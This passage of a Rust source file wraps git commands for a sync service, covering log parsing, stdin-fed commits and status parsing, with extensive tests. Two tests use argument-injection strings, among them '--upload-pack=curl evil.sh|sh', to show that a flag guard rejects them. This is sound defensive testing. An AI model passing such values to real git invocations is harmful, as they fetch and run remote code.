        // failure the same way it launders an unborn branch: a repo whose
        // history cannot be read answers identically to one that has none.
        //
        // `git rev-parse --verify --quiet HEAD` is a true structural test
        // for "no commits yet" rather than a string match on git's
        // (locale-dependent) error text: it fails cleanly — nonzero exit,
        // NOTHING on stdout or stderr — exactly when there is no commit for
        // HEAD to name, and it succeeds (printing the sha) the moment one
        // commit exists, even when some OTHER object further back the
        // history is unreadable. Paid only on this already-failed path, not
        // on every call.
        //
        // The predicate checks stderr too, not merely the exit code: a repo
        // git cannot open exits 128 from this rev-parse just as an unborn
        // branch does, but WITH `fatal: not a git repository` on stderr —
        // verified live against a deleted `.git/objects/`, a garbage
        // `.git/HEAD`, and a stale linked worktree (gitfile pointing at a
        // gitdir removed from `.git/worktrees/`). Only a truly silent
        // failure — nothing on stdout, nothing on stderr — is "no commits
        // yet"; anything else is a read failure and falls through to `Err`
        // below.
        let head = run_git(repo, &["rev-parse", "--verify", "--quiet", "HEAD"], timeout).await?;
        if !head.ok() && head.stdout.is_empty() && head.stderr.is_empty() {
            return Ok(Vec::new());
        }
        return Err(GitError::Failed(if out.stderr.is_empty() {
            format!("git log exited {}", out.code)
        } else {
            out.stderr
        }));
    }
    Ok(parse_log(&out.stdout))
}

/// Split `run_git`'s trimmed stdout into `LogEntry` rows.
///
/// `run_git` already trims the WHOLE string, not per line, so only the
/// outermost blank lines are affected; an empty `stdout` (no commits matched)
/// yields `lines()` producing nothing, which is the correct empty list.
fn parse_log(stdout: &str) -> Vec<LogEntry> {
    stdout
        .lines()
        .filter(|line| !line.is_empty())
        .filter_map(|line| {
            let mut parts = line.splitn(4, '\u{0}');
            Some(LogEntry {
                sha: parts.next()?.to_string(),
                subject: parts.next()?.to_string(),
                author: parts.next()?.to_string(),
                date: parts.next()?.to_string(),
            })
        })
        .collect()
}

/// `run_git` with bytes piped to the child's stdin.
///
/// Exists for exactly one caller class: values that must never enter argv.
/// A commit message is request-derived free text; `-F -` reads it from stdin,
/// so there is no argument position for git to misread (§ 3.2's rule in its
/// strongest form — not even `validate_arg` is asked to carry it).
pub async fn run_git_stdin(
    repo: &Path,
    args: &[&str],
    input: &[u8],
    timeout: Duration,
) -> Result<GitOutput, GitError> {
    use tokio::io::AsyncWriteExt;
    let mut cmd = git_command(repo, args);
    cmd.stdin(Stdio::piped());
    let fut = async {
        let mut child = cmd.spawn().map_err(|e| GitError::Failed(e.to_string()))?;
        let mut stdin = child.stdin.take().expect("stdin was piped two lines up");
        stdin
            .write_all(input)
            .await
            .map_err(|e| GitError::Failed(e.to_string()))?;
        drop(stdin); // EOF: git reads the message to end-of-input
        child
            .wait_with_output()
            .await
            .map_err(|e| GitError::Failed(e.to_string()))
    };
    match tokio::time::timeout(timeout, fut).await {
        Err(_) => Err(GitError::Timeout),
        Ok(Err(e)) => Err(e),
        Ok(Ok(out)) => Ok(GitOutput {
            code: out.status.code().unwrap_or(-1),
            stdout: String::from_utf8_lossy(&out.stdout).trim().to_string(),
            stderr: String::from_utf8_lossy(&out.stderr).trim().to_string(),
        }),
    }
}

/// `git add --all` — stage everything, untracked included. No request value
/// reaches argv at all.
pub async fn add_all(repo: &Path, timeout: Duration) -> Result<(), GitError> {
    require_ok(run_git(repo, &["add", "--all"], timeout).await?, "git add --all")
}

/// `git commit -F -` — the message arrives on stdin, never argv.
///
/// No `--amend`, no `--allow-empty`, deliberately: the commit grant's stated
/// meaning is append-only authorship on the current branch, and this
/// invocation is where that sentence is true or false.
pub async fn commit(repo: &Path, message: &str, timeout: Duration) -> Result<(), GitError> {
    require_ok(
        run_git_stdin(repo, &["commit", "-F", "-"], message.as_bytes(), timeout).await?,
        "git commit",
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testgit::{
        advance_remote, commit, corrupt_head_object, git_sync, remote_and_clone,
        stale_linked_worktree,
    };

    #[test]
    fn the_command_builder_pins_the_c_locale() {
        // push_action_error and the rev-parse discriminator read git's words;
        // a localized git translates them and classification silently degrades
        // to "transport". The env pin is what the classifiers stand on.
        let cmd = git_command(Path::new("/tmp"), &["status"]);
        let envs: Vec<_> = cmd.as_std().get_envs().collect();
        assert!(
            envs.contains(&(std::ffi::OsStr::new("LC_ALL"), Some(std::ffi::OsStr::new("C")))),
            "{envs:?}"
        );
    }

    #[tokio::test]
    async fn run_git_reports_stdout_and_a_zero_code() {
        let (_remote, clone) = remote_and_clone();
        let out = run_git(&clone, &["rev-parse", "--abbrev-ref", "HEAD"], DEFAULT_TIMEOUT)
            .await
            .unwrap();
        assert_eq!(out.code, 0);
        assert_eq!(out.stdout, "main");
    }

    #[tokio::test]
    async fn run_git_reports_a_nonzero_code_rather_than_erroring() {
        // A failing git command is DATA, not a transport failure: `@{u}` on a
        // branch with no upstream exits 128, and that is the answer, not a bug.
        let (_remote, clone) = remote_and_clone();
        git_sync(&clone, &["checkout", "-b", "orphan"]);
        let out = run_git(
            &clone,
            &["rev-parse", "--abbrev-ref", "--symbolic-full-name", "@{u}"],
            DEFAULT_TIMEOUT,
        )
        .await
        .unwrap();
        assert_ne!(out.code, 0);
    }

    #[tokio::test]
    async fn run_git_times_out_rather_than_hanging() {
        // The deadline is driven to zero rather than the command being made
        // slow. No git subcommand is reliably slow enough to race against a
        // wall-clock timeout without being flaky, and a genuinely blocking one
        // (a fetch against a black hole) makes the unit suite depend on the
        // network. A 1ns deadline is already elapsed when the timeout is first
        // polled — process spawn costs microseconds at minimum — so this is
        // deterministic in a way a 200ms-vs-fast-command race is not.
        let (_remote, clone) = remote_and_clone();
        let err = run_git(&clone, &["status", "--porcelain"], Duration::from_nanos(1))
            .await
            .unwrap_err();
        assert_eq!(err, GitError::Timeout);
    }

    // There is deliberately NO test for `.stdin(Stdio::null())`.
    //
    // Amended 2026-07-31, David ruling, after a task review found the test that
    // was here could not discriminate. It ran `git hash-object --stdin-paths`
    // and asserted it returned rather than hanging — which only proves anything
    // when the TEST BINARY'S OWN stdin is open. Under CI, or any non-interactive
    // shell, stdin is already `/dev/null`, the child hits EOF either way, and the
    // test passes against a regression that deletes the very line it guards.
    //
    // A green light that means nothing is worse than an absent one, and the
    // honest fix was to stop claiming the coverage. The reasoning lives on the
    // production line instead. (Making it real would mean holding a pipe and
    // `dup2`-ing it onto fd 0 — an `unsafe` block and platform-specific fd
    // handling in a crate that has neither, to guard one setting.)

    #[tokio::test]
    async fn is_dirty_sees_an_uncommitted_change() {
        let (_remote, clone) = remote_and_clone();
        assert!(!is_dirty(&clone, DEFAULT_TIMEOUT).await.unwrap());
        std::fs::write(clone.join("seed.md"), "edited").unwrap();
        assert!(is_dirty(&clone, DEFAULT_TIMEOUT).await.unwrap());
    }

    #[tokio::test]
    async fn is_dirty_sees_an_untracked_file() {
        // `--porcelain` reports untracked files by default, and that is wanted:
        // a new uncommitted note in the commons is work that a fast-forward
        // could disturb, so it counts.
        let (_remote, clone) = remote_and_clone();
        std::fs::write(clone.join("new-note.md"), "draft").unwrap();
        assert!(is_dirty(&clone, DEFAULT_TIMEOUT).await.unwrap());
    }

    #[tokio::test]
    async fn newest_commit_is_an_iso_timestamp() {
        let (_remote, clone) = remote_and_clone();
        let ts = newest_commit(&clone, DEFAULT_TIMEOUT).await.unwrap().unwrap();
        // `%cI` is strict ISO 8601: 2026-07-30T14:22:07-07:00
        assert!(ts.len() >= 20, "expected an ISO timestamp, got {ts:?}");
        assert_eq!(&ts[4..5], "-");
        assert!(ts.contains('T'));
    }

    #[tokio::test]
    async fn pull_ff_applies_the_remote_commits() {
        let (remote, clone) = remote_and_clone();
        advance_remote(&remote);
        fetch(&clone, DEFAULT_TIMEOUT).await.unwrap();
        pull_ff(&clone, DEFAULT_TIMEOUT).await.unwrap();
        assert!(clone.join("from-elsewhere.md").exists());
        // HEAD landed exactly on upstream, not merely somewhere past it.
        let head = run_git(&clone, &["rev-parse", "HEAD"], DEFAULT_TIMEOUT)
            .await
            .unwrap()
            .stdout;
        let upstream = run_git(&clone, &["rev-parse", "@{u}"], DEFAULT_TIMEOUT)
            .await
            .unwrap()
            .stdout;
        assert_eq!(head, upstream, "a fast-forward must land HEAD on upstream");
    }

    #[tokio::test]
    async fn pull_ff_refuses_a_diverged_branch_and_leaves_head_unmoved() {
        let (remote, clone) = remote_and_clone();
        advance_remote(&remote);
        commit(&clone, "local-only.md", "mine");
        fetch(&clone, DEFAULT_TIMEOUT).await.unwrap();

        let before = run_git(&clone, &["rev-parse", "HEAD"], DEFAULT_TIMEOUT)
            .await
            .unwrap()
            .stdout;
        assert!(pull_ff(&clone, DEFAULT_TIMEOUT).await.is_err());
        let after = run_git(&clone, &["rev-parse", "HEAD"], DEFAULT_TIMEOUT)
            .await
            .unwrap()
            .stdout;

        assert_eq!(before, after, "a refused fast-forward must not move HEAD");
        // And no merge was created behind our back.
        assert!(!clone.join("from-elsewhere.md").exists());
    }

    #[test]
    fn validate_arg_rejects_a_leading_dash() {
        // Argv defeats the SHELL. It does not defeat git's own flag parsing:
        // --upload-pack and -c core.sshCommand= execute programs. This is the
        // guard, and it runs before run_git rather than trusting `--`.
        assert!(validate_arg("main").is_ok());
        assert!(validate_arg("feat/x").is_ok());
        assert!(validate_arg("--upload-pack=curl evil.sh|sh").is_err());
        assert!(matches!(validate_arg("-c"), Err(GitError::InvalidArg(_))));
    }

    #[tokio::test]
    async fn push_sends_local_commits_to_the_remote() {
        let (remote, clone) = remote_and_clone();
        commit(&clone, "mine.md", "local work");
        push(&clone, DEFAULT_TIMEOUT).await.unwrap();

        // Verified from a THIRD checkout, not from the pusher's own refs — the
        // pusher's origin/main moves whether or not the remote accepted it.
        let verify = tempfile::tempdir().unwrap().keep();
        git_sync(&verify, &["clone", remote.to_str().unwrap(), verify.to_str().unwrap()]);
        assert!(verify.join("mine.md").exists(), "the remote never received the commit");
    }

    // The four porcelain shapes below are transcribed from live runs against a
    // scratch remote on 2026-08-08, not composed by hand. The fast-forward
    // flag is a literal SPACE, which is easy to write as an empty field and
    // then never exercise.

    #[test]
    fn porcelain_reports_what_the_remote_moved() {
        // The summary field carries the REMOTE's account of the transition —
        // which is why we read this instead of a local `@{u}`, a value that
        // describes a remote we may not have fetched.
        let out = "To /tmp/remote.git\n \
                   \trefs/heads/main:refs/heads/main\t8b8d973..8c4d533\n\
                   Done";
        let r = parse_porcelain(out);
        assert_eq!(r.reference.as_deref(), Some("refs/heads/main"));
        assert_eq!(r.before.as_deref(), Some("8b8d973"));
        assert_eq!(r.after.as_deref(), Some("8c4d533"));
    }

    #[test]
    fn a_new_branch_has_no_before_and_it_stays_absent() {
        // `--porcelain` reports a created ref with `*` and `[new branch]`,
        // carrying NO old sha, because there was nothing to move from. A
        // `000000…` here would be a fabrication dressed as a measurement.
        let out = "To /tmp/remote.git\n\
                   *\trefs/heads/feature/y:refs/heads/feature/y\t[new branch]\n\
                   Done";
        let r = parse_porcelain(out);
        assert_eq!(r.reference.as_deref(), Some("refs/heads/feature/y"));
        assert_eq!(r.before, None, "no old sha may be invented");
        assert_eq!(r.after, None, "and no new one may be read out of a summary that has none");
    }

    #[test]
    fn an_up_to_date_push_reports_no_movement() {
        let out = "To /tmp/remote.git\n\
                   =\trefs/heads/main:refs/heads/main\t[up to date]\n\
                   Done";
        let r = parse_porcelain(out);
        assert_eq!(r.reference.as_deref(), Some("refs/heads/main"));
        assert_eq!(r.before, None);
        assert_eq!(r.after, None);
    }

    #[test]
    fn a_rejection_summary_yields_a_ref_but_never_a_sha_pair() {
        // The rejected line reaches the parser too, because the failure
        // message carries stdout. It must name the ref and invent nothing.
        let out = "To /tmp/remote.git\n\
                   !\trefs/heads/main:refs/heads/main\t[rejected] (fetch first)\n\
                   Done";
        let r = parse_porcelain(out);
        assert_eq!(r.reference.as_deref(), Some("refs/heads/main"));
        assert_eq!(r.before, None);
        assert_eq!(r.after, None);
    }

    #[test]
    fn unparseable_output_yields_an_empty_report_rather_than_a_wrong_one() {
        // A future git whose format we do not recognise must produce
        // "we don't know" and never a plausible-looking pair of shas.
        let r = parse_porcelain("something entirely unexpected");
        assert_eq!(r.reference, None);
        assert_eq!(r.before, None);
        assert_eq!(r.after, None);
    }

    #[tokio::test]
    async fn head_sha_is_a_sha_and_not_the_date_newest_commit_returns() {
        // The two helpers read the same commit and answer different questions.
        // The plan reached for `newest_commit` to fill `repo_pulled`'s
        // before/after, which would have written an ISO timestamp into a field
        // every other part of this design treats as a revision. This pins them
        // apart so a future edit cannot quietly swap one for the other.
        let (_remote, clone) = remote_and_clone();
        let sha = head_sha(&clone, DEFAULT_TIMEOUT).await.unwrap().unwrap();
        let date = newest_commit(&clone, DEFAULT_TIMEOUT).await.unwrap().unwrap();

        assert_eq!(sha.len(), 40, "a full sha, got {sha}");
        assert!(sha.chars().all(|c| c.is_ascii_hexdigit()), "got {sha}");
        assert!(date.contains('T'), "newest_commit is a date, got {date}");
        assert_ne!(sha, date);
    }

    #[tokio::test]
    async fn head_sha_on_a_repo_with_no_commits_is_none_not_an_error() {
        let empty = tempfile::tempdir().unwrap().keep();
        crate::testgit::git_sync(&empty, &["init", "--initial-branch=main", "."]);
        assert_eq!(head_sha(&empty, DEFAULT_TIMEOUT).await.unwrap(), None);
    }

    #[tokio::test]
    async fn count_range_counts_what_the_push_moved() {
        let (_remote, clone) = remote_and_clone();
        let before = head_sha(&clone, DEFAULT_TIMEOUT).await.unwrap().unwrap();
        commit(&clone, "one.md", "a");
        commit(&clone, "two.md", "b");
        let after = head_sha(&clone, DEFAULT_TIMEOUT).await.unwrap().unwrap();

        let n = count_range(&clone, &before, &after, DEFAULT_TIMEOUT).await.unwrap();
        assert_eq!(n, 2, "two commits were made, so two moved");
        // And the empty range is 0, not an error — an up-to-date push.
        assert_eq!(count_range(&clone, &after, &after, DEFAULT_TIMEOUT).await.unwrap(), 0);
    }

    #[tokio::test]
    async fn count_range_refuses_a_flag_shaped_argument() {
        let (_remote, clone) = remote_and_clone();
        assert!(matches!(
            count_range(&clone, "--upload-pack=evil", "HEAD", DEFAULT_TIMEOUT).await,
            Err(GitError::InvalidArg(_))
        ));
    }

    #[tokio::test]
    async fn a_successful_push_reports_the_range_the_remote_moved() {
        let (_remote, clone) = remote_and_clone();
        let before = run_git(&clone, &["rev-parse", "HEAD"], DEFAULT_TIMEOUT)
            .await
            .unwrap()
            .stdout;
        commit(&clone, "mine.md", "local work");
        let after = run_git(&clone, &["rev-parse", "HEAD"], DEFAULT_TIMEOUT)
            .await
            .unwrap()
            .stdout;

        let report = push(&clone, DEFAULT_TIMEOUT).await.unwrap();
        assert_eq!(report.reference.as_deref(), Some("refs/heads/main"));
        // Git abbreviates in the porcelain summary, so the assertion is a
        // prefix relation against the FULL shas read from the repo — not a
        // re-derivation of the same abbreviation, which would be a tautology.
        let (rb, ra) = (report.before.unwrap(), report.after.unwrap());
        assert!(before.starts_with(&rb), "{before} does not begin with {rb}");
        assert!(after.starts_with(&ra), "{after} does not begin with {ra}");
        assert_ne!(rb, ra, "a push that moved something reports two different shas");
    }

    #[tokio::test]
    async fn a_rejected_push_keeps_its_discriminator_after_the_flag_moved_it() {
        // BUILD RISK 1, at this layer. `--porcelain` relocates the `[rejected]`
        // marker from stderr to stdout; `push_action_error` classifies on that
        // marker. If `push` reported stderr alone the marker would be gone and
        // the kind would degrade silently. Measured, not assumed: under the
        // flag, stderr carries only "error: failed to push some refs".
        let (remote, clone) = remote_and_clone();
        advance_remote(&remote);
        commit(&clone, "mine.md", "local work");
        fetch(&clone, DEFAULT_TIMEOUT).await.unwrap();

        let err = push(&clone, DEFAULT_TIMEOUT).await.unwrap_err();
        let GitError::Failed(msg) = err else { panic!("expected Failed, got {err:?}") };
        assert!(
            msg.contains("[rejected]"),
            "the discriminator must survive the reporting flag; got: {msg}"
        );
    }

    #[tokio::test]
    async fn push_fails_on_a_diverged_branch_rather_than_forcing() {
        let (remote, clone) = remote_and_clone();
        advance_remote(&remote);
        commit(&clone, "mine.md", "local work");
        fetch(&clone, DEFAULT_TIMEOUT).await.unwrap();
        assert!(push(&clone, DEFAULT_TIMEOUT).await.is_err());

        let verify = tempfile::tempdir().unwrap().keep();
        git_sync(&verify, &["clone", remote.to_str().unwrap(), verify.to_str().unwrap()]);
        assert!(!verify.join("mine.md").exists(), "a refused push must not land");
    }

    #[tokio::test]
    async fn fetch_is_an_error_on_a_repo_with_no_remote() {
        // Not a panic and not a silent success — the sweep needs to report it.
        let solo = tempfile::tempdir().unwrap().keep();
        git_sync(&solo, &["init", "--initial-branch=main", "."]);
        commit(&solo, "alone.md", "solo");
        assert!(fetch(&solo, DEFAULT_TIMEOUT).await.is_err());
    }

    #[tokio::test]
    async fn log_lists_commits_newest_first_with_every_field() {
        let (_remote, clone) = remote_and_clone();
        commit(&clone, "second.md", "two");
        let entries = log(&clone, 10, DEFAULT_TIMEOUT).await.unwrap();

        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].subject, "second.md");
        assert_eq!(entries[1].subject, "seed.md");
        assert_eq!(entries[0].sha.len(), 40, "a full sha, not an abbreviation");
        assert_eq!(entries[0].author, "test");
        assert!(entries[0].date.contains('T'), "expected an ISO date, got {:?}", entries[0].date);
    }

    #[tokio::test]
    async fn log_is_capped_at_the_caller_supplied_limit() {
        let (_remote, clone) = remote_and_clone();
        commit(&clone, "second.md", "two");
        commit(&clone, "third.md", "three");
        let entries = log(&clone, 1, DEFAULT_TIMEOUT).await.unwrap();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].subject, "third.md", "the newest, not the oldest");
    }

    #[tokio::test]
    async fn log_on_an_unborn_branch_is_an_empty_list_not_an_error() {
        // A fresh `git init` with zero commits: `git log` exits nonzero here,
        // and that is answered as "nothing yet", not a malfunction of the
        // read — distinguished from a genuine read failure (see the next
        // test) by `git rev-parse --verify --quiet HEAD` also failing, since
        // there is truly no commit for HEAD to name.
        let empty = tempfile::tempdir().unwrap().keep();
        git_sync(&empty, &["init", "--initial-branch=main", "."]);
        assert_eq!(log(&empty, 10, DEFAULT_TIMEOUT).await.unwrap(), Vec::new());
    }

    #[tokio::test]
    async fn log_on_a_repo_with_a_corrupt_object_is_an_error_not_an_empty_list() {
        // THE regression this closes: a repo WITH history, one of whose
        // objects cannot be read, must not report "no commits yet" — that
        // reads identically to a real unborn branch, and the whole-branch
        // review found it live (a corrupt repo yielding `200 []` from
        // `/log`). `git log` exits 128 with empty stdout here — the SAME
        // shape an unborn branch produces — so what tells them apart is
        // `rev-parse --verify --quiet HEAD`, which still succeeds: the ref
        // names a real commit, even though that commit's object is damaged.
        let (_remote, clone) = remote_and_clone();
        corrupt_head_object(&clone);
        let err = log(&clone, 10, DEFAULT_TIMEOUT).await.unwrap_err();
        assert!(matches!(err, GitError::Failed(_)), "expected Failed, got {err:?}");
    }

    #[tokio::test]
    async fn log_on_a_repo_git_cannot_open_is_an_error_not_an_empty_list() {
        // N1: a repo git cannot OPEN at all — a stale linked worktree whose
        // gitdir was removed out from under it — is a different trigger from
        // the corrupt-object case above, but the same defect: `git log`
        // exits 128 with empty stdout, the identical shape an unborn branch
        // produces, so the fix must not fold it to "no commits yet" either.
        // Unlike the corrupt-object case, `rev-parse --verify --quiet HEAD`
        // ALSO fails here — but with `fatal: not a git repository` on
        // stderr, not silently, which is what the predicate must check for.
        let (_remote, clone) = remote_and_clone();
        let orphan = stale_linked_worktree(&clone);
        let err = log(&orphan, 10, DEFAULT_TIMEOUT).await.unwrap_err();
        assert!(matches!(err, GitError::Failed(_)), "expected Failed, got {err:?}");
    }

    #[test]
    fn parse_log_splits_nul_separated_fields_across_multiple_entries() {
        let out = "aaa\u{0}first subject\u{0}Ada\u{0}2026-08-04T00:00:00-07:00\n\
                    bbb\u{0}second subject\u{0}Grace\u{0}2026-08-03T00:00:00-07:00";
        let entries = parse_log(out);
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].sha, "aaa");
        assert_eq!(entries[0].subject, "first subject");
        assert_eq!(entries[0].author, "Ada");
        assert_eq!(entries[0].date, "2026-08-04T00:00:00-07:00");
        assert_eq!(entries[1].sha, "bbb");
    }

    #[test]
    fn parses_a_tracking_branch_with_both_counts() {
        let out = "# branch.oid 00f45bf037e0b34f312360d54a6e778107da42f7\n\
                   # branch.head feat/whyte-subheaders\n\
                   # branch.upstream origin/feat/whyte-subheaders\n\
                   # branch.ab +3 -1\n";
        let s = parse_status_v2(out);
        assert_eq!(s.branch.as_deref(), Some("feat/whyte-subheaders"));
        assert_eq!(s.head.as_deref(), Some("00f45bf037e0b34f312360d54a6e778107da42f7"));
        assert_eq!(
            s.position,
            Position::Tracking { upstream: "origin/feat/whyte-subheaders".into(), ahead: 3, behind: 1 }
        );
        assert_eq!(s.dirty_files, 0);
    }

    #[test]
    fn an_upstream_without_an_ab_line_is_upstream_gone_not_zero_zero() {
        // Verified live 2026-08-04 against armillary-core/.worktrees/workspace-sync:
        // an upstream is configured, its remote-tracking ref is gone (merged and
        // pruned), and git omits `branch.ab` entirely. Read as Tracking{0,0} this
        // renders "up to date" for a repo whose upstream no longer exists.
        let out = "# branch.oid 40fcfa9c6a13b6c104d8b1a8ae23ea1f25f4b6ce\n\
                   # branch.head feat/workspace-sync\n\
                   # branch.upstream origin/feat/workspace-sync\n";
        let s = parse_status_v2(out);
        assert_eq!(
            s.position,
            Position::UpstreamGone { upstream: "origin/feat/workspace-sync".into() }
        );
    }

    #[test]
    fn a_branch_with_no_upstream_line_is_no_upstream() {
        let out = "# branch.oid 270ce701866b36c8da2126bcd9b74e8a0629c050\n\
                   # branch.head main\n";
        assert_eq!(parse_status_v2(out).position, Position::NoUpstream);
    }

    #[test]
    fn the_literal_detached_marker_is_detached_and_leaves_branch_none() {
        let out = "# branch.oid cd0a50fbcc83b6e783c0520263b4a43734d79e4d\n\
                   # branch.head (detached)\n";
        let s = parse_status_v2(out);
        assert_eq!(s.position, Position::Detached);
        assert_eq!(s.branch, None);
        // The oid is still wanted — it is the only thing identifying where HEAD is.
        assert!(s.head.is_some());
    }

    #[test]
    fn a_repo_with_no_commits_yet_has_no_head_not_the_literal_marker() {
        // Verified live 2026-08-04: `git status --porcelain=v2 --branch` on a
        // fresh `git init` with nothing committed prints the literal
        // `(initial)` in place of an oid — there is no commit for `head` to
        // name, and the design's contract for that is `None`, the same
        // treatment `(detached)` already gets for `branch`.
        let out = "# branch.oid (initial)\n# branch.head main\n";
        let s = parse_status_v2(out);
        assert_eq!(s.head, None);
        assert_eq!(s.branch.as_deref(), Some("main"));
    }

    #[test]
    fn dirty_files_counts_every_entry_kind_including_untracked() {
        // 1 = ordinary change, 2 = rename, u = unmerged, ? = untracked.
        // All four are "this working tree has uncommitted work" and all four count.
        let out = "# branch.oid abc123\n\
                   # branch.head main\n\
                   1 .M N... 100644 100644 100644 aaa bbb src/lib.rs\n\
                   2 R. N... 100644 100644 100644 ccc ddd R100 new.rs\told.rs\n\
                   u UU N... 100644 100644 100644 100644 eee fff ggg conflict.rs\n\
                   ? untracked.md\n";
        assert_eq!(parse_status_v2(out).dirty_files, 4);
    }

    #[test]
    fn changed_files_are_parsed_with_the_right_kind_and_staged_flag() {
        let out = "# branch.oid abc123\n\
                   # branch.head main\n\
                   1 .M N... 100644 100644 100644 aaa bbb src/lib.rs\n\
                   2 R. N... 100644 100644 100644 ccc ddd R100 new.rs\told.rs\n\
                   u UU N... 100644 100644 100644 100644 eee fff ggg conflict.rs\n\
                   ? untracked.md\n";
        let files = parse_status_v2(out).files;
        assert_eq!(
            files,
            vec![
                ChangedFile { path: "src/lib.rs".into(), change: "modified", staged: false },
                // The rename's DESTINATION path, not its origin — `new.rs`,
                // the half of "new.rs\told.rs" a client renders as THE path.
                ChangedFile { path: "new.rs".into(), change: "renamed", staged: true },
                // Unmerged is always "modified", never derived from XY: "UU"
                // describes a conflict, not an add or a delete.
                ChangedFile { path: "conflict.rs".into(), change: "modified", staged: true },
                ChangedFile { path: "untracked.md".into(), change: "untracked", staged: false },
            ]
        );
    }

    #[test]
    fn an_added_and_a_deleted_file_are_told_apart_from_a_plain_modification() {
        let out = "# branch.oid abc123\n\
                   # branch.head main\n\
                   1 A. N... 000000 100644 100644 000 aaa new-file.md\n\
                   1 .D N... 100644 100644 000000 bbb 000 gone.md\n";
        let files = parse_status_v2(out).files;
        assert_eq!(files[0].change, "added");
        assert!(files[0].staged);
        assert_eq!(files[1].change, "deleted");
        assert!(!files[1].staged);
    }

    #[test]
    fn a_header_only_output_from_a_clean_repo_is_not_dirty() {
        let out = "# branch.oid abc123\n# branch.head main\n# branch.ab +0 -0\n";
        assert_eq!(parse_status_v2(out).dirty_files, 0);
    }

    #[test]
    fn last_fetch_reads_fetch_head_and_returns_none_without_one() {
        let (_remote, clone) = remote_and_clone();
        // A fresh clone has no FETCH_HEAD — cloning is not fetching.
        std::fs::remove_file(clone.join(".git/FETCH_HEAD")).ok();
        assert_eq!(last_fetch(&clone), None);

        // Non-empty, as a real successful fetch leaves it — an empty file is
        // the failed-fetch shape covered by the test below.
        std::fs::write(clone.join(".git/FETCH_HEAD"), "abc123\t\tbranch 'main' of foo\n").unwrap();
        let ts = last_fetch(&clone).expect("FETCH_HEAD exists and is non-empty");
        assert!(ts.contains('T'), "expected ISO 8601, got {ts:?}");
        assert!(ts.len() >= 20, "expected ISO 8601, got {ts:?}");
    }

    #[tokio::test]
    async fn last_fetch_is_none_after_a_fetch_that_never_reached_the_remote() {
        // THE CRITICAL finding: git TRUNCATES FETCH_HEAD to zero bytes on a
        // fetch that fails to contact its remote, and bumps its mtime doing
        // so. Read naively (any non-empty-or-absent file means "fetched"),
        // this reports a fetch that touched nothing as "just now" — a repo
        // going from "never fetched" to "fetched just now" by way of a fetch
        // that failed. Verified live 2026-08-04 against git 2.50.1.
        let (_remote, clone) = remote_and_clone();
        // A real successful fetch first, so FETCH_HEAD exists and is non-empty.
        fetch(&clone, DEFAULT_TIMEOUT).await.unwrap();
        assert!(last_fetch(&clone).is_some(), "a successful fetch must be visible");

        // Point origin at an unreachable path and fetch again — this must
        // fail, and per the verified behaviour above, truncate FETCH_HEAD.
        run_git(&clone, &["remote", "set-url", "origin", "/nonexistent/does-not-exist.git"], DEFAULT_TIMEOUT)
            .await
            .unwrap();
        assert!(fetch(&clone, DEFAULT_TIMEOUT).await.is_err(), "fetch against a bad path must fail");

        assert_eq!(
            last_fetch(&clone),
            None,
            "a fetch that failed to reach the remote must not report as a successful contact"
        );
    }

    #[test]
    fn worktree_count_counts_linked_trees_only() {
        let (_remote, clone) = remote_and_clone();
        assert_eq!(worktree_count(&clone), 0, "a plain checkout has no linked trees");

        let wt = clone.join(".worktrees/topic");
        git_sync(&clone, &["worktree", "add", wt.to_str().unwrap(), "-b", "topic"]);
        // The main checkout is NOT counted — .git/worktrees/ holds linked trees
        // only, which is why this is 1 and `git worktree list` prints 2 lines.
        assert_eq!(worktree_count(&clone), 1);
    }

    #[test]
    fn worktree_count_from_a_linked_tree_reports_the_family_not_zero() {
        // A linked tree's OWN `.git` is a file (`gitdir: <path>`), not a
        // directory — before the gitdir resolution, `read_dir` on the
        // (nonexistent) "<wt>/.git/worktrees" failed and `unwrap_or(0)`
        // silently reported the same 0 a solo checkout with no linked trees
        // reports. Reading FROM the linked tree must answer the same family
        // count the main checkout would, not swallow the lookup failure.
        let (_remote, clone) = remote_and_clone();
        let wt = clone.join(".worktrees/topic");
        git_sync(&clone, &["worktree", "add", wt.to_str().unwrap(), "-b", "topic"]);
        assert_eq!(worktree_count(&wt), 1);
    }

    #[test]
    fn has_submodules_is_a_stat_on_gitmodules() {
        let (_remote, clone) = remote_and_clone();
        assert!(!has_submodules(&clone));
        std::fs::write(clone.join(".gitmodules"), "[submodule \"x\"]\n").unwrap();
        assert!(has_submodules(&clone));
    }

    #[tokio::test]
    async fn commit_records_the_full_stdin_message_and_stages_untracked() {
        let dir = tempfile::tempdir().unwrap();
        let repo = dir.path();
        git_sync(repo, &["init", "-b", "main"]);
        commit(repo, "tracked.md", "original"); // fixture: an initial commit
        std::fs::write(repo.join("tracked.md"), "edited").unwrap();
        std::fs::write(repo.join("untracked.md"), "new").unwrap();

        super::add_all(repo, DEFAULT_TIMEOUT).await.unwrap();
        super::commit(repo, "subject line\n\nbody\n\nCommitted-from: iphone", DEFAULT_TIMEOUT)
            .await
            .unwrap();

        let log = run_git(repo, &["log", "-1", "--format=%B"], DEFAULT_TIMEOUT)
            .await
            .unwrap();
        assert!(log.stdout.contains("subject line"));
        assert!(log.stdout.contains("Committed-from: iphone"));
        let status = run_git(repo, &["status", "--porcelain"], DEFAULT_TIMEOUT)
            .await
            .unwrap();
        assert!(status.stdout.is_empty(), "both files must be committed, got: {}", status.stdout);
    }

    #[tokio::test]
    async fn commit_on_nonzero_exit_is_failed_not_ok() {
        let dir = tempfile::tempdir().unwrap();
        let repo = dir.path();
        git_sync(repo, &["init", "-b", "main"]);
        // Nothing staged, nothing committed ever: `git commit` exits nonzero.
        let err = super::commit(repo, "message", DEFAULT_TIMEOUT).await.unwrap_err();
        assert!(matches!(err, GitError::Failed(_)));
    }
}
